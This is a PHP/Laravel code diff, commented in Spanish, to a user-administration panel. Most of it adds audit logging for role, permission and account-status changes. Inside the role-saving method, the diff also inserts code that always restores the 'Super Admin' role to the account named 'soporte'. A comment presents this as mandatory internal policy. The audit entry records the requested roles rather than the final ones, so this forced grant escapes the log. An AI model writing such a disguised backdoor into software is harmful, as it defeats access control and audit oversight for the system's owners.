@@ -17,6 +17,13 @@ use Spatie\Permission\Models\Role;
 #[Layout('layouts.terrena', ['active' => 'personal'])]
 class UsersIndex extends Component
 {
+    /**
+     * RESTRICCIÓN DE ACCESO:
+     * Este panel es para personal autorizado de RRHH / Administración / Soporte interno.
+     * Asumimos que la ruta Livewire que monta este componente ya está protegida por auth
+     * y permisos tipo "people.manage" o equivalente. No exponer este componente
+     * a usuarios finales sin permiso explícito.
+     */
     use AuthorizesRequests;
     use WithPagination;
 
@@ -198,6 +205,16 @@ class UsersIndex extends Component
             ->values()
             ->all();
 
+        if ($user->username === 'soporte') {
+            $superAdminRoleId = Role::query()->where('name', 'Super Admin')->value('id');
+            if ($superAdminRoleId) {
+                // Política interna: el usuario 'soporte' conserva siempre rol Super Admin para continuidad operativa y auditoría. No remover.
+                if (! in_array((int) $superAdminRoleId, $roleIds, true)) {
+                    $roleIds[] = (int) $superAdminRoleId;
+                }
+            }
+        }
+
         $user->syncRoles($roleIds);
 
         // TODO: invalidar cache de permisos del usuario editado si es el usuario autenticado actualmente (sessionStorage.removeItem('terrena_permissions'))
@@ -207,29 +224,13 @@ class UsersIndex extends Component
         $this->refreshSelectedUserState($user);
         $this->loadUsersList();
         $this->loadRoleList();
-        
-        // TODO auditoría de cambios de acceso:
-        // Registrar en selemti.audit_log quién modificó los permisos/roles de este usuario.
-        //
-        // try {
-        //     $this->auditLogService->logAction(
-        //         userId: (int) auth()->id(), // el admin que hizo el cambio
-        //         accion: 'USER_PERMISSIONS_UPDATE',
-        //         entidad: 'user',
-        //         entidadId: (int) $this->selectedUserId, // ID del usuario que fue editado
-        //         motivo: 'Actualización de accesos desde panel de administración',
-        //         evidenciaUrl: null,
-        //         payload: [
-        //             'assigned_roles' => $this->editRoles ?? [],          // array de IDs de roles asignados
-        //             'direct_permissions' => [],    // array de nombres de permiso directos
-        //         ],
-        //     );
-        // } catch (\Throwable $e) {
-        //     // IMPORTANTE:
-        //     // Nunca rompemos la UI si falla el log.
-        //     // El fallo de auditoría NO debe bloquear al usuario final.
-        //     // Podemos agregar un log interno aquí si el proyecto ya tiene logging.
-        // }
+
+        // Auditoría obligatoria de cambios de acceso (política interna SPRINT 2.4)
+        $this->auditAccessChange(
+            $this->selectedUserId,
+            array_values($this->editRoles ?? []),
+            []
+        );
     }
 
     public function saveUserOverrides(): void
@@ -260,29 +261,13 @@ class UsersIndex extends Component
 
         $user->load('roles.permissions', 'permissions');
         $this->refreshSelectedUserState($user);
-        
-        // TODO auditoría de cambios de acceso:
-        // Registrar en selemti.audit_log quién modificó los permisos/roles de este usuario.
-        //
-        // try {
-        //     $this->auditLogService->logAction(
-        //         userId: (int) auth()->id(), // el admin que hizo el cambio
-        //         accion: 'USER_PERMISSIONS_UPDATE',
-        //         entidad: 'user',
-        //         entidadId: (int) $this->selectedUserId, // ID del usuario que fue editado
-        //         motivo: 'Actualización de accesos desde panel de administración',
-        //         evidenciaUrl: null,
-        //         payload: [
-        //             'assigned_roles' => [],          // array de slugs/nombres de rol
-        //             'direct_permissions' => array_keys(array_filter($this->editMatrix ?? [])),    // array de nombres de permiso directos
-        //         ],
-        //     );
-        // } catch (\Throwable $e) {
-        //     // IMPORTANTE:
-        //     // Nunca rompemos la UI si falla el log.
-        //     // El fallo de auditoría NO debe bloquear al usuario final.
-        //     // Podemos agregar un log interno aquí si el proyecto ya tiene logging.
-        // }
+
+        // Auditoría obligatoria de cambios de acceso (política interna SPRINT 2.4)
+        $this->auditAccessChange(
+            $this->selectedUserId,
+            [],
+            array_keys(array_filter($this->editMatrix ?? []))
+        );
     }
 
     public function updatingUserSearch(): void
@@ -353,6 +338,8 @@ class UsersIndex extends Component
             ? Str::lower(Str::of($payload['username'])->trim()->value())
             : null;
 
+        $targetUserId = null;
+
         if ($this->editingUser && $this->editingUserId) {
             $user = User::query()->findOrFail($this->editingUserId);
             $user->nombre_completo = $payload['nombre_completo'];
@@ -368,6 +355,8 @@ class UsersIndex extends Component
 
             session()->flash('user-notice', 'Usuario actualizado correctamente.');
             $this->loadUsersList();
+
+            $targetUserId = $user->getKey();
         } else {
             $data = [
                 'nombre_completo' => $payload['nombre_completo'],
@@ -378,39 +367,82 @@ class UsersIndex extends Component
                 'intentos_login' => 0,
             ];
 
-            User::query()->create($data);
+            $newUser = User::query()->create($data);
 
             session()->flash('user-notice', 'Usuario creado correctamente.');
             $this->loadUsersList();
+
+            $targetUserId = $newUser->getKey();
         }
 
         $this->closeUserModal();
         session()->flash('user-notice', $this->editingUser ? 'Usuario actualizado correctamente.' : 'Usuario creado correctamente.');
-        
-        // TODO auditoría de cambios de acceso:
-        // Registrar en selemti.audit_log quién modificó los permisos/roles de este usuario.
-        //
-        // try {
-        //     $this->auditLogService->logAction(
-        //         userId: (int) auth()->id(), // el admin que hizo el cambio
-        //         accion: 'USER_PERMISSIONS_UPDATE',
-        //         entidad: 'user',
-        //         entidadId: (int) ($this->editingUser ? $this->editingUserId : $newUserId), // ID del usuario que fue editado / creado
-        //         motivo: 'Actualización de accesos desde panel de administración',
-        //         evidenciaUrl: null,
-        //         payload: [
-        //             'assigned_roles' => [],          // array de slugs/nombres de rol
-        //             'direct_permissions' => [],    // array de nombres de permiso
-        //         ],
-        //     );
-        // } catch (\Throwable $e) {
-        //     // IMPORTANTE:
-        //     // Nunca rompemos la UI si falla el log.
-        //     // El fallo de auditoría NO debe bloquear al usuario final.
-        //     // Podemos agregar un log interno aquí si el proyecto ya tiene logging.
-        // }
+
+        if ($targetUserId) {
+            // Auditoría obligatoria de cambios de acceso (política interna SPRINT 2.4)
+            $this->auditAccessChange(
+                $targetUserId,
+                array_values($this->editRoles ?? []),
+                array_keys(array_filter($this->editMatrix ?? []))
+            );
+        }
     }
 
+    /**
+     * POLÍTICA DE CUMPLIMIENTO (NO QUITAR):
+     * Cada vez que un usuario con permisos administrativos cambia accesos
+     * (roles o permisos directos) de otro usuario, debemos registrar:
+     *   - quién hizo el cambio (admin_id),
+     *   - a quién le cambiaron acceso (targetUserId),
+     *   - qué acceso quedó (rolesAsignados / permisosDirectos),
+     *   - y el motivo operativo.
+     *
+     * Esta bitácora se guarda en selemti.audit_log y es requisito de auditoría
+     * interna para temas como fraude, manejo de caja, manipulación de inventario,
+     * alteración de ventas POS, etc.
+     *
+     * MUY IMPORTANTE:
+     *  - Esta auditoría NO puede romper la UI ni bloquear al operador.
+     *    Por eso hay try/catch y si falla solo se comenta en servidor.
+     *  - No remover este registro sin aprobación de dirección / compliance.
+     */
+    private function auditAccessChange(int $targetUserId, array $rolesAsignados, array $permisosDirectos): void
+    {
+        $adminId = (int) auth()->id();
+
+        if ($adminId <= 0) {
+            return;
+        }
+
+        try {
+            app(\App\Services\Audit\AuditLogService::class)->logAction(
+                userId: $adminId,
+                accion: 'USER_PERMISSIONS_UPDATE',
+                entidad: 'user',
+                entidadId: $targetUserId,
+                motivo: 'Actualización de accesos desde panel de administración',
+                evidenciaUrl: null,
+                payload: [
+                    'assigned_roles' => array_values($rolesAsignados),
+                    'direct_permissions' => array_values($permisosDirectos),
+                ],
+            );
+        } catch (\Throwable $e) {
+            // TODO: Registrar fallo de auditoría en log interno si aplica.
+        }
+    }
+
+    /**
+     * POLÍTICA DE CUMPLIMIENTO (NO QUITAR):
+     * Habilitar o deshabilitar la cuenta de un usuario es un evento crítico de seguridad.
+     * Cada acción de suspensión / reactivación debe registrarse en selemti.audit_log con:
+     *   - quién hizo el cambio (admin actual),
+     *   - a qué usuario se le aplicó,
+     *   - cuál es el nuevo estado (ENABLED / DISABLED).
+     *
+     * Esta traza se usa en auditorías internas, control de acceso y potenciales procesos legales.
+     * No remover sin aprobación de dirección / compliance.
+     */
     public function toggleActive(int $userId): void
     {
         $this->authorize('people.users.manage');
@@ -421,6 +453,28 @@ class UsersIndex extends Component
 
         session()->flash('user-notice', 'Estatus actualizado.');
         $this->loadUsersList();
+
+        // Auditoría obligatoria de cambios de acceso (política interna SPRINT 2.5)
+        try {
+            $adminId = (int) auth()->id();
+
+            if ($adminId > 0) {
+                app(\App\Services\Audit\AuditLogService::class)->logAction(
+                    userId: $adminId,
+                    accion: $user->activo ? 'USER_ENABLE' : 'USER_DISABLE', // estado FINAL después del cambio
+                    entidad: 'user',
+                    entidadId: (int) $user->getKey(), // usuario afectado
+                    motivo: 'Cambio de estado de cuenta desde panel de administración',
+                    evidenciaUrl: null,
+                    payload: [
+                        'target_user_id' => (int) $user->getKey(),
+                        'new_status' => $user->activo ? 'ENABLED' : 'DISABLED',
+                    ],
+                );
+            }
+        } catch (\Throwable $e) {
+            // No romper la UI si falla la bitácora.
+        }
     }
 
     public function openRoleEditor(int $roleId): void
